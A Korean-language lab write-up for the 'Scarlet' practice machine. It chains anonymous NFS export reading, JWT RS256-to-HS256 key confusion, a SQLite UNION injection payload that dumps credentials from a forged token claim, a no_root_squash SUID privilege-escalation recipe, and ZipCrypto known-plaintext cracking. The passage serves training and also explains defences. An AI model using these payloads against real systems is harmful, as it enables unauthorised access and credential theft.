---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/nfs
  - tech/web/sqli
  - tech/web/jwt
  - tech/crypto/known-plaintext
  - tech/exec/ssh-key
type: machine
platform: pg
os: linux
ip: 192.168.248.222
domain: scarlet.local
ports: [22, 80, 111, 2049, 33527, 41543, 53291, 53845, 59493]
services: [http, mountd, nfs_acl, nlockmgr, rpcbind, ssh, status]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] PG Practice — Scarlet
> **타겟** 192.168.248.222 (`scarlet.local`) · **OS** Ubuntu 22.04 LTS (5.15.0-41-generic) · **플래그 2개** (`local.txt` + `proof.txt`)
> **경로 요약** NFS(2049) 익명 export `/mnt/share` 마운트 → **RSA 공개키 확보** → Express 앱의 **JWT RS256→HS256 키 혼동(key confusion)** 으로 토큰 위조 → 위조 토큰의 `username` 클레임에 **SQLite 인젝션** → `brian:Standingbytheseaside12` 덤프 → SSH로 `local.txt` → `/opt/backup.zip`(ZipCrypto)을 **동일 공개키를 known-plaintext로 쓴 bkcrack**으로 복호화 → 내부의 `root@scarlet` 개인키 → `ssh -i` 로 root

---

## 0. 이 박스에서 배우는 것

- **NFS export는 그 자체로 정보 유출 채널이다.** 셸이 없어도 파일을 읽는다. 여기서 얻은 공개키 한 장이 이후 두 단계(JWT 위조 · zip 복호화)를 전부 열었다
- **JWT `alg` 혼동 공격** — RS256으로 서명된 토큰을 **공개키를 HMAC 비밀키로 삼아** HS256으로 다시 서명한다. "공개키는 공개돼도 안전하다"는 전제가 구현 결함 하나로 무너지는 지점
- **인증 토큰의 클레임도 입력값이다** — 쿠키 안의 `username`이 그대로 SQL 문자열에 연결된다. **인젝션 지점은 폼 필드만이 아니다**
- **ZipCrypto known-plaintext 공격(bkcrack)** — 암호를 크랙하는 게 아니라, **압축파일 안의 파일 하나를 이미 알고 있으면 비밀번호 없이 전체를 푼다**
- **한 아티팩트가 두 번 쓰인다** — 같은 `public.key`가 JWT 위조 재료이자 zip 복호화의 known-plaintext였다. **획득한 파일을 "이미 다 썼다"고 치우지 마라**

> [!tip] 시험 출제 가능성
> **부분적으로 높다.** 요소별로 갈린다.
> - **NFS 열거(`showmount -e` → mount → 파일 수집)는 시험 단골이다.** 111/2049가 보이면 무조건 밟는 절차다. 이 부분은 그대로 시험 자산이다.
> - **JWT 조작(alg none / RS256→HS256 / 약한 HMAC 비밀키)** 도 웹 단계에서 충분히 나올 수 있다. 특히 `alg: none`과 `HS256` 혼동은 기본기다.
> - **bkcrack(ZipCrypto known-plaintext)은 시험에 나올 확률이 낮다.** 다만 "암호 걸린 백업 zip을 만났을 때 `zip2john` 사전공격 말고 다른 수가 있다"는 판단 분기는 알아둘 값어치가 있다.
>
> 변형 예상: NFS에 `id_rsa`가 그냥 놓여 있는 형태 / JWT 비밀키가 `secret`·`jwt_secret` 같은 약한 문자열이라 `hashcat -m 16500`으로 뚫리는 형태 / 백업 zip의 암호가 앞 단계에서 얻은 DB 비밀번호와 같은 형태.

---

## 1. 정찰

### Nmap

전 포트 + 서비스/OS 탐지. 기록에 남은 명령은 `nnmap`이지만 **출력의 `Not shown: 65526 closed tcp ports`가 전수 스캔(`-p-`)임을 증명**한다 — 65535 포트를 전부 봤다는 뜻이다. `[가정]` 쉘 별칭에 `-p- -sCV -A`가 묶여 있는 것으로 보인다.

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ nnmap 192.168.248.222
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-19 12:56 +0900
Nmap scan report for 192.168.248.222
Host is up (0.085s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn''t have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      53845/tcp   mountd
|   100005  1,2,3      58558/udp   mountd
|   100021  1,3,4      32877/udp   nlockmgr
|   100021  1,3,4      33527/tcp   nlockmgr
|   100024  1          39417/udp   status
|   100024  1          41543/tcp   status
|_  100227  3           2049/tcp   nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
33527/tcp open  nlockmgr 1-4 (RPC #100021)
41543/tcp open  status   1 (RPC #100024)
53291/tcp open  mountd   1-3 (RPC #100005)
53845/tcp open  mountd   1-3 (RPC #100005)
59493/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   84.39 ms 192.168.45.1
2   84.35 ms 192.168.45.254
3   85.18 ms 192.168.251.1
4   85.35 ms 192.168.248.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```

> [!danger] **111 + 2049가 같이 보이면 그 순간 NFS가 최우선 타겟이다**
> `rpcbind`(111)는 목록판일 뿐이고 실제 파일 공유는 **2049/nfs**가 한다. 여기에 `mountd`가 **고번호 포트 3개(53291·53845·59493)** 로 흩어져 있다.
>
> **다만 이것이 `-p-`가 필요한 이유는 아니다 — 이 노트의 옛 서술은 틀렸다.** `showmount`는 스캔 결과를 쓰지 않는다. **111번 portmapper에 물어 mountd의 현재 포트를 런타임에 받아** 그리로 붙는다. 내가 그 고번호 포트를 스캔했는지와 무관하다. **111과 2049는 nmap top-1000에 들어 있으므로 기본 스캔만으로도 NFS 열거는 온전하다.** (아래 141행에서 이 노트 자신이 "`showmount`는 mountd 프로토콜에 답한다"고 설명해 놓고, 여기서 스캔 커버리지와 혼동했다.)
> 그럼에도 `-p-`를 도는 값어치는 다른 데 있다 — **고번호 포트에 무엇이 붙어 있는지 문서화**하는 것, 그리고 **RPC 밖의 비표준 포트 서비스**를 놓치지 않는 것이다.
>
> **셸을 잡기 전에 파일을 읽을 수 있는 서비스**는 NFS·SMB·FTP·TFTP·rsync 정도다. 이런 게 열려 있으면 **웹보다 먼저** 밟는다. 비용이 30초다.

nmap의 `rpcinfo` 스크립트 결과와 **독립 근거를 하나 더** 확보한다 — `rpcinfo -p`를 직접 친다. 두 출처가 일치해야 포트 매핑을 믿는다.

```bash
┌──(kali㉿kali)-[~/PG]
└─$ rpcinfo -p 192.168.248.222
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  46813  mountd
    100005    1   tcp  53291  mountd
    100005    2   udp  36537  mountd
    100005    2   tcp  59493  mountd
    100005    3   udp  58558  mountd
    100005    3   tcp  53845  mountd
    100024    1   udp  39417  status
    100024    1   tcp  41543  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  32877  nlockmgr
    100021    3   udp  32877  nlockmgr
    100021    4   udp  32877  nlockmgr
    100021    1   tcp  33527  nlockmgr
    100021    3   tcp  33527  nlockmgr
    100021    4   tcp  33527  nlockmgr
```

핵심은 `100003` 두 줄이다 — **nfs 버전 3과 4가 모두 살아 있다.** 이게 중요한 이유는 `showmount -e`가 **NFSv3의 mountd 프로토콜**에만 답하기 때문이다. v4 전용 서버라면 `showmount`가 빈 결과를 내고, 대신 `mount -t nfs4 <ip>:/ /mnt`로 **의사 루트를 마운트해서 뒤져야** 한다.

UDP 쪽도 같이 확인했다(내용은 위와 동일한 매핑이라 중략).

```bash
rpcinfo -T udp 192.168.248.222
   program version netid     address                service    owner
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    ... (중략) ...
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100021    1    udp       0.0.0.0.128.109        nlockmgr   superuser
    ... (중략) ...
    100021    4    tcp       0.0.0.0.130.247        nlockmgr   superuser
```

> [!note] `0.0.0.0.8.1` 을 읽는 법
> 이 표기는 **universal address**다. 마지막 두 옥텟이 포트의 상위/하위 바이트다 — `8.1` = `8*256 + 1` = **2049**. `130.247` = `130*256+247` = **33527**. 포트 번호가 숫자로 안 보인다고 당황할 필요 없다.

### 웹 열거 — IP로 치면 아무것도 없다

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ feroxbuster -u http://192.168.248.222/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100
 ... (배너 중략) ...
 🎯  Target Url            │ http://192.168.248.222/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💲  Extensions            │ [php, txt, html, bak, zip]
 🔃  Recursion Depth       │ 4
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       66c http://192.168.248.222/
200      GET        1l        1w       66c http://192.168.248.222/index.html
[####################] - 3m    180000/180000  0s      found:2       errors:0
[####################] - 3m    180000/180000  1138/s  http://192.168.248.222/     
```

**3분을 태우고 나온 것이 66바이트짜리 index.html 한 장이다.** 여기서 "웹은 없다"고 접으면 이 박스의 절반을 놓친다.

> [!danger] **66c / 1줄 1단어 = 가상호스트(vhost) 신호다**
> 정상 사이트가 66바이트일 수 없다. nginx가 **IP로 들어온 요청은 기본 서버 블록(빈 페이지)** 으로 보내고, **`Host:` 헤더가 맞아야 진짜 앱**을 준다는 뜻이다.
> 판별 기준 셋: ① 응답이 비정상적으로 작다 ② 디렉터리 버스팅이 0건에 수렴한다 ③ nmap이 `http-title` 을 못 뽑는다(`Site doesn't have a title`).
> 대응: **`/etc/hosts`에 호스트명을 박고 다시 친다.** 호스트명 후보는 nmap TLS 인증서 CN·SAN, 페이지 본문, 리다이렉트 `Location`, 박스 이름 자체(`scarlet.local`)에서 나온다.
> 자동화하려면 `ffuf -u http://IP/ -H "Host: FUZZ.<도메인>" -w subdomains.txt -fs 66` 처럼 **기본 페이지 크기(66)를 필터링**한다.

`[가정]` 원문에 `scarlet.local`을 어떻게 알아냈는지는 기록돼 있지 않다. 박스 이름 + `.local` 관례로 찍었거나 66바이트 index.html 본문에 링크가 있었을 것이다. **시험이라면 `curl -s http://IP/ | cat -A`로 그 66바이트를 반드시 눈으로 확인하고 넘어가라** — 이 노트의 가장 큰 기록 공백이다.

```bash
┌──(kali㉿kali)-[~/PG]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouter
240.0.0.1  nagoya.nagoya-industries.com
192.168.248.222 scarlet.local
```

### 호스트명을 붙이자 앱 전체가 드러난다

같은 워드리스트, 같은 옵션인데 결과가 2건에서 45건으로 바뀐다.

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ feroxbuster -u http://scarlet.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100
 ... (배너·설정 중략) ...
──────────────────────────────────────────────────
404      GET        1l        4w       27c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        4w       28c http://scarlet.local/logout => http://scarlet.local/login
301      GET       10l       16w      173c http://scarlet.local/css => http://scarlet.local/css/
200      GET        7l       74w     4617c http://scarlet.local/assets/bootstrap/css/bootstrap-reboot.min.css
301      GET       10l       16w      179c http://scarlet.local/assets => http://scarlet.local/assets/
200      GET      304l     1677w   138148c http://scarlet.local/assets/images/mbr-3.jpeg
302      GET        1l        4w       28c http://scarlet.local/portal => http://scarlet.local/login
200      GET      570l     3113w   280183c http://scarlet.local/assets/images/mbr.png
200      GET      934l     1582w    15529c http://scarlet.local/assets/socicon/css/styles.css
200      GET        6l     1919w   155585c http://scarlet.local/assets/bootstrap/css/bootstrap.min.css
200      GET       15l       35w      321c http://scarlet.local/assets/parallax/jarallax.css
200      GET      961l     1708w    14947c http://scarlet.local/assets/theme/css/style.css
200      GET      191l      409w     3817c http://scarlet.local/css/style.css
200      GET       94l      237w     3830c http://scarlet.local/login
200      GET      265l      748w     7945c http://scarlet.local/assets/dropdown/css/style.css
200      GET      498l      850w     8709c http://scarlet.local/assets/web/assets/mobirise-icons2/mobirise2.css
200      GET       94l      237w     3830c http://scarlet.local/Login
200      GET     1746l     4268w    42320c http://scarlet.local/assets/mobirise/css/mbr-additional.css
200      GET        6l      309w    51452c http://scarlet.local/assets/bootstrap/css/bootstrap-grid.min.css
301      GET       10l       16w      193c http://scarlet.local/assets/images => http://scarlet.local/assets/images/
200      GET      459l     2379w   190079c http://scarlet.local/assets/images/mbr-2.jpg
200      GET      880l     5197w   381436c http://scarlet.local/assets/images/mbr-10.jpg
301      GET       10l       16w      187c http://scarlet.local/assets/web => http://scarlet.local/assets/web/
200      GET     1316l     7711w   584073c http://scarlet.local/assets/images/mbr-9.jpg
200      GET      924l     5182w   590321c http://scarlet.local/assets/images/mbr-6.jpg
200      GET     2678l    14443w   831460c http://scarlet.local/assets/images/ali-morshedlou-wmd64tmfc4k-unsplash.jpg
301      GET       10l       16w      201c http://scarlet.local/assets/web/assets => http://scarlet.local/assets/web/assets/
301      GET       10l       16w      177c http://scarlet.local/views => http://scarlet.local/views/
301      GET       10l       16w      191c http://scarlet.local/assets/theme => http://scarlet.local/assets/theme/
200      GET     1484l     8955w   901311c http://scarlet.local/assets/images/dan-cornilov-ehuyu820lca-unsplash.jpg
200      GET     1086l     9298w   900460c http://scarlet.local/assets/images/linkedin-sales-solutions-pata8xe-ivm-unsplash.jpg
200      GET      405l     1254w    20445c http://scarlet.local/
200      GET      102l      285w     4294c http://scarlet.local/views/login.html
301      GET       10l       16w      199c http://scarlet.local/assets/theme/css => http://scarlet.local/assets/theme/css/
301      GET       10l       16w      197c http://scarlet.local/assets/theme/js => http://scarlet.local/assets/theme/js/
200      GET      405l     1254w    20445c http://scarlet.local/views/index.html
200      GET      109l      350w     6084c http://scarlet.local/views/portal.html
301      GET       10l       16w      181c http://scarlet.local/helpers => http://scarlet.local/helpers/
302      GET        1l        4w       28c http://scarlet.local/Portal => http://scarlet.local/login
302      GET        1l        4w       28c http://scarlet.local/Logout => http://scarlet.local/login
301      GET       10l       16w      197c http://scarlet.local/assets/dropdown => http://scarlet.local/assets/dropdown/
301      GET       10l       16w      203c http://scarlet.local/assets/dropdown/js => http://scarlet.local/assets/dropdown/js/
301      GET       10l       16w      205c http://scarlet.local/assets/dropdown/css => http://scarlet.local/assets/dropdown/css/
301      GET       10l       16w      179c http://scarlet.local/routes => http://scarlet.local/routes/
301      GET       10l       16w      187c http://scarlet.local/middleware => http://scarlet.local/middleware/
302      GET        1l        4w       28c http://scarlet.local/PORTAL => http://scarlet.local/login
[####################] - 6m   2880792/2880792 0s      found:45      errors:380474
 ... (재귀 스캔 진행줄 16개 중략) ...
```

이 목록에서 **읽어야 할 줄은 다섯 개**다:

| 발견 | 무엇을 뜻하는가 |
|---|---|
| `/views/`, `/routes/`, `/helpers/`, `/middleware/` | **Express(Node.js) 앱의 표준 디렉터리 구조**다. PHP가 아니다 — `.php` 확장자를 계속 붙이는 건 낭비 |
| `/portal` → 302 → `/login` | **인증 게이트가 걸린 목표 페이지.** 여기를 인증 없이 열면 이긴다 |
| `/views/portal.html` 이 **200으로 직접 열린다** | 라우터를 거치지 않는 정적 템플릿이 노출됐다. 포털이 어떤 필드를 렌더하는지 미리 볼 수 있다 |
| `/Login`, `/Portal`, `/PORTAL` 이 전부 응답 | Express의 `case sensitive routing`은 **기본이 비활성**이다. 즉 누가 설정한 것이 아니라 **아무것도 안 한 결과**다(구분하게 하려면 `app.set('case sensitive routing', true)`를 명시해야 한다). 실질적 의미는 하나 — **결과 45건 중 상당수가 중복**이다 |
| `errors:380474` | 재귀 깊이 4 + 100 스레드로 앱을 두들겨 타임아웃이 대량 발생했다. **결과 신뢰도가 떨어진다** |

> [!warning] 스캐너 함정 — `errors:380474`를 무시하지 마라
> 오류 38만 건은 "스캔이 끝났다"가 아니라 **"상당수 경로를 확인 못 했다"** 는 뜻이다. Node 단일 프로세스 앱에 `-t 100`은 과하다.
> 시험에서는 `-t 20~30`으로 낮추고, 오류가 많으면 **핵심 경로만 골라 재확인**한다. 여기서는 `/views/`·`/routes/` 아래를 다시 훑을 가치가 있었다.

### NFS export 목록

웹을 파는 동안 NFS는 30초면 답이 나온다.

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ showmount -e 192.168.248.222
Export list for 192.168.248.222:
/mnt/share *
```

`*` — **호스트 제한이 전혀 없다.** 인터넷 어디서든 마운트할 수 있다는 뜻이다. 이 한 줄이 나온 시점에 웹 작업을 잠시 멈추고 마운트부터 하는 것이 옳다.

> [!tip] NFS를 만나면 항상 이 순서
> ```bash
> showmount -e <IP>                      # export 목록
> showmount -a <IP>                      # 현재 마운트 중인 클라이언트 (정보 유출)
> showmount -d <IP>                      # 마운트된 디렉터리
> mkdir -p /tmp/nfs
> sudo mount -t nfs <IP>:/<export> /tmp/nfs -o nolock
> ls -lan /tmp/nfs                       # -n 이 핵심: 이름 대신 숫자 UID/GID를 본다
> ```
> `showmount`가 비면 **NFSv4 전용**을 의심하고 `sudo mount -t nfs4 <IP>:/ /tmp/nfs` 로 의사 루트를 마운트한다.

---

## 2. 취약점 분석

이 박스는 취약점이 **네 개 연쇄**한다. 하나씩 메커니즘을 세운다.

### 2-1. NFS 익명 export — 왜 파일이 읽히는가

**배경 지식.** NFS는 애초에 "신뢰된 LAN"을 전제로 설계된 프로토콜이다. **NFSv3에는 사용자 인증이 사실상 없다.** 클라이언트가 RPC 요청에 `AUTH_SYS` 자격을 실어 보내는데, 그 내용은 그냥 **"내 UID는 1000, GID는 1000이다"라는 자기 신고**다. 서버는 그걸 믿는다.

즉 접근 통제의 실체는 두 가지뿐이다:

| 통제 | 어디서 정하는가 | 우회 가능성 |
|---|---|---|
| **어느 호스트가 마운트할 수 있는가** | `/etc/exports`의 호스트 스펙 (`*`, `10.0.0.0/8`, `client.lan`) | `*`면 통제 없음 |
| **어느 UID로 접근하는가** | 클라이언트의 자기 신고 | **로컬 root면 마음대로 조작 가능** |

`showmount -e`가 `/mnt/share *`를 뱉었으므로 첫 번째 통제는 없다. 그래서 마운트가 그냥 된다.

**`root_squash` / `no_root_squash`.** 서버는 자기 신고 UID를 그대로 쓰지 않고 한 가지만 뭉갠다 — **UID 0(root) 요청을 `nobody`(65534)로 강등**하는 것이 `root_squash`이고, 이게 **기본값**이다.

`no_root_squash`가 켜져 있으면 **클라이언트의 root가 서버의 root가 된다.** 그 순간 다음이 성립한다:

```bash
# no_root_squash 인 경우에만 성립하는 고전 권한상승
sudo mount -t nfs <IP>:/export /tmp/nfs
sudo cp /bin/bash /tmp/nfs/bash        # 서버에 root 소유로 기록된다
sudo chown root:root /tmp/nfs/bash
sudo chmod u+s /tmp/nfs/bash           # SUID root 비트를 서버 파일시스템에 심는다
# 타겟에서 셸을 잡은 뒤:  /export/bash -p   → uid=0
```

> [!danger] **이 박스는 `no_root_squash`가 아니다.** 고전 NFS 권한상승은 여기서 통하지 않는다
> 나중에 셸을 잡고 확인한 실제 설정은 이랬다:
> ```
> /mnt/share *(rw,sync,no_subtree_check)
> ```
> `no_root_squash`가 **없다** → 기본값 `root_squash`가 적용된다. 그래서 SUID 바이너리를 심어도 root 소유로 기록되지 않는다.
> **그러면 이 NFS의 가치는 무엇인가 — 순수한 읽기(정보 유출)다.** 그리고 그것만으로 충분했다.
> **교훈: `no_root_squash`가 아니라고 NFS를 버리지 마라.** export 안에 무엇이 들어 있는지가 본질이다. 키·설정파일·백업·DB 파일 하나면 체인이 열린다.

**UID 일치시키기.** 마운트했는데 `Permission denied`가 뜨면 파일 소유자 UID가 내 로컬 UID와 다른 것이다. 대응은 두 가지다.

```bash
# ① 파일의 실제 UID를 숫자로 확인한다 (-n 이 핵심)
ls -lan /tmp/nfs
# 예: -rw------- 1 1001 1001 ... id_rsa   → UID 1001의 파일

# ② 로컬에 같은 UID의 사용자를 만들고 그 사용자로 접근한다
sudo useradd -u 1001 nfsvictim
sudo -u nfsvictim cat /tmp/nfs/id_rsa

# 또는 기존 사용자의 UID를 바꾼다 (되돌리기 번거로우니 ①을 권장)
sudo usermod -u 1001 kali
```

이 박스에서는 필요 없었다. `essentials/`가 `drwxr-xr-x root root`, 안의 `public.key`도 **누구나 읽을 수 있는 권한**이었기 때문이다. 하지만 `id_rsa`가 놓인 export를 만나면 거의 항상 `0600`이므로 **UID 일치는 반드시 손에 익혀야 하는 절차**다.

### 2-2. JWT 키 혼동(Key Confusion) — 공개키가 왜 위험해지는가

**배경 지식.** JWT는 `헤더.페이로드.서명` 세 조각을 점으로 이은 base64url 문자열이다. 헤더 안의 `alg` 필드가 **서명 알고리즘을 선언**한다.

| `alg` | 서명 방식 | 검증에 쓰는 값 |
|---|---|---|
| `HS256` | HMAC-SHA256 — **대칭키** | 서명할 때와 **같은 비밀키** |
| `RS256` | RSA-SHA256 — **비대칭키** | **공개키** (서명은 개인키로) |

이 앱이 발급한 토큰의 헤더는 `{"alg":"RS256","typ":"JWT"}`다. 정상 흐름에서는 서버가 개인키로 서명하고 공개키로 검증한다. 공개키는 유출돼도 안전하다 — **`alg`를 신뢰하지 않는다는 전제 하에서만.**

**취약한 구현 패턴.** 대부분의 JWT 라이브러리는 이런 API를 갖는다:

```js
// 취약: 검증 알고리즘을 고정하지 않았다
jwt.verify(token, PUBLIC_KEY);

// 안전: 허용 알고리즘을 명시한다
jwt.verify(token, PUBLIC_KEY, { algorithms: ['RS256'] });
```

첫 번째 형태에서 라이브러리는 **토큰 헤더의 `alg`를 보고 검증 방식을 고른다.** 여기서 데이터 흐름이 뒤집힌다:

```
공격자가 alg를 HS256으로 바꾼다
        ↓
라이브러리: "HS256이네 → HMAC 검증이다 → 두 번째 인자를 HMAC 비밀키로 쓰자"
        ↓
두 번째 인자는 PUBLIC_KEY 다  ← 공격자도 알고 있는 값
        ↓
공격자가 PUBLIC_KEY를 HMAC 비밀키로 서명한 토큰이 통과한다
```

**즉 "검증용 공개키"가 "서명용 비밀키"로 재해석된다.** 공개키를 손에 넣는 순간 임의의 페이로드를 발행할 수 있다.

> [!danger] 재료 조건 — **공개키의 바이트가 정확히 일치해야 한다**
> HMAC 비밀키는 바이트열이다. 서버가 파일에서 읽은 PEM 문자열 그대로(줄바꿈·마지막 개행 포함)를 키로 쓰므로, **NFS에서 얻은 `public.key`가 서버가 쓰는 파일과 바이트 단위로 같아야** 서명이 맞는다.
> 이 박스는 백업 zip 안의 `web/public.key`와 NFS의 `essentials/public.key`가 동일 파일이었다 — 그래서 통했다. **개행 하나만 달라도 실패한다. 실패했다면 트레일링 개행 유무를 먼저 의심하라.**

### 2-3. JWT 클레임을 통한 SQL 인젝션 — 인젝션 지점은 폼이 아니다

토큰을 위조해도 **`admin`은 존재하지 않는 사용자**였다. 그래서 관리자 권한이 아니라 **다른 무기**를 찾아야 했다.

포털은 토큰의 `username` 클레임을 받아 DB에서 사용자를 조회하고, 그 결과를 `<strong>Hey {이름}, <br>` 형태로 화면에 반사한다. 여기가 결정적이다 — **인증 미들웨어가 검증한 값을 "안전한 값"으로 취급해 SQL에 문자열 연결**한 것이다.

```js
// [가정] 원문에는 소스가 없으나 에러 메시지로부터 역산한 형태
const q = "SELECT ... FROM users WHERE username = '" + payload.username + "'";
db.get(q, ...)
```

`username`에 `brian'` 하나를 넣으면 SQLite 파서가 이렇게 답한다:

```
Error: SQLITE_ERROR: unrecognized token: "'brian''"
```

이 에러 문자열이 **세 가지를 동시에 확정**한다:

1. **DBMS는 SQLite다** (`SQLITE_ERROR`). → MySQL/MSSQL 문법을 쓰면 안 된다
2. **작은따옴표로 감싼 문자열 연결**이다 (`'brian''` — 내가 넣은 `'`가 닫는 따옴표 뒤에 붙어 열린 채로 남았다)
3. **에러가 그대로 응답에 실린다** → 에러 기반 확인이 가능하고, 그 위에 UNION이 얹힌다

> [!tip] **인증을 통과한 값일수록 검증이 느슨하다**
> 개발자는 "미들웨어가 서명을 검증했으니 이 클레임은 우리가 발급한 값"이라고 믿는다. **서명이 뚫리면 그 믿음이 전부 취약점이 된다.**
> 시험 반사: 쿠키·JWT 클레임·`X-Forwarded-For`·`User-Agent`·세션에 저장된 값 — **한 번 검증을 거쳐 "내부값"이 된 데이터가 인젝션의 노른자다.**

### 2-4. 왜 이 UNION 페이로드인가 — 조각내기

최종적으로 쓴 페이로드다.

```sql
zzz' UNION SELECT group_concat(username||':'||password,'  '),2,3 FROM users-- -
```

| 조각 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `zzz'` | **원 쿼리를 빈 결과로 만들고** 문자열을 닫는다. `zzz`라는 사용자는 없다 | 실제 사용자명을 쓰면 원 결과가 1행 반환돼 **UNION 결과가 화면에 안 보인다**(첫 행만 렌더하므로) |
| `UNION SELECT` | 다른 테이블의 결과를 같은 결과집합에 이어붙인다 | — |
| `group_concat(...)` | 여러 **행**을 한 문자열로 압축. 화면에 한 줄만 반사되므로 필수 | 첫 행 하나만 얻는다. 사용자가 2명이면 반쪽만 |
| `username\|\|':'\|\|password` | SQLite의 문자열 연결 연산자는 **`\|\|`** 다 | MySQL식 `CONCAT()`은 **SQLite 3.44.0(2023-11-01) 미만에 함수 자체가 없어** `no such function: concat`이 난다 — 이 박스(Ubuntu 22.04, sqlite 3.37)가 정확히 그 경우다. 3.44 이후는 **가변 인자**를 받는다. **"인자 정확히 2개" 제한은 Oracle의 `CONCAT` 규칙이지 SQLite가 아니다.** `+`를 쓰면 숫자 덧셈이 돼 **`0`이 나온다** |
| `,'  '` | `group_concat`의 구분자를 공백 2칸으로 지정 (기본은 `,`) | 값에 콤마가 있으면 파싱이 헷갈린다 |
| `,2,3` | **컬럼 수를 원 쿼리와 맞춘다** | 개수가 다르면 `SELECTs to the left and right of UNION do not have the same number of result columns` 에러 |
| `FROM users` | 대상 테이블 | — |
| `-- -` | 뒤에 남은 원 쿼리(닫는 따옴표, `LIMIT` 등)를 주석 처리 | 없으면 문법 오류 |

> [!note] `-- -` 의 꼬리 `-`는 왜 붙이는가
> MySQL은 `--` 뒤에 **공백이나 제어문자**가 있어야 주석으로 인식한다. 그래서 `-- -`(대시 둘 + 공백 + 임의 문자)가 관용구로 굳었다. SQLite는 `--`만으로 충분하지만, **DBMS를 확정하기 전에는 `-- -`로 쓰는 습관**이 안전하다. URL 인코딩 구간에서는 뒤 공백이 잘려나가는 사고도 이 습관으로 막힌다.

**컬럼 수 3은 어떻게 알았나.** `[가정]` 원문에 컬럼 수 탐색 과정이 남아 있지 않다. 표준 절차는 다음 둘 중 하나다:

```sql
-- 예시 — 이 박스에서 발생한 출력이 아니다 (표준 절차의 재현 예시)
-- ① ORDER BY 이진 탐색: 에러가 나기 직전 숫자가 컬럼 수
zzz' ORDER BY 1-- -     → 정상
zzz' ORDER BY 3-- -     → 정상
zzz' ORDER BY 4-- -     → 1st ORDER BY term out of range

-- ② UNION 개수 늘려가기
zzz' UNION SELECT 1-- -        → 컬럼 수 불일치 에러
zzz' UNION SELECT 1,2-- -      → 불일치
zzz' UNION SELECT 1,2,3-- -    → 통과.  화면에 어느 숫자가 반사되는지도 함께 확인된다
```

②를 쓰면 **컬럼 수와 반사 위치를 한 번에** 얻는다. 여기서는 1번 컬럼이 `<strong>Hey ...` 자리에 반사됐다.

### 2-5. ZipCrypto known-plaintext — 비밀번호를 몰라도 푼다

**배경 지식.** zip 포맷의 전통 암호(**ZipCrypto**, PKWARE 1990)는 96비트 내부 상태(`key0/key1/key2`)를 쓰는 스트림 암호다. **1994년 Biham–Kocher가 known-plaintext 공격을 발표**했다(FSE 1994, LNCS 1008) — 평문 일부를 알면 비밀번호를 거치지 않고 내부 키 3개를 직접 복구할 수 있다.

> [!note] 요구 평문 길이 — **논문 수치와 도구 수치를 섞지 마라**
> - **논문(Biham–Kocher)**: **13바이트** (그중 **8바이트가 연속**이어야 한다)
> - **bkcrack 구현**: **12바이트**
>
> 흔히 "12바이트면 된다"로 뭉뚱그리는데, 그것은 **도구의 요구치**다. 이론 수치를 인용해야 하는 자리(보고서·시험 서술)에서 12를 쓰면 근거와 어긋난다.

핵심은 이것이다:

> **복구되는 것은 비밀번호가 아니라 내부 키다.** 그리고 그 내부 키는 **아카이브 전체에 공통**이므로, 파일 하나의 평문만 알면 **나머지 모든 파일이 풀린다.**

이 박스에서 성립한 조건:

```
backup.zip 안에  web/public.key  가 들어 있다
        +
NFS 에서 그와 동일한  public.key  를 이미 확보했다
        ↓
공격자는 암호화된 엔트리 하나의 평문을 완전히 알고 있다  →  bkcrack 성립
```

> [!warning] **평문은 "압축된 상태"로 줘야 한다**
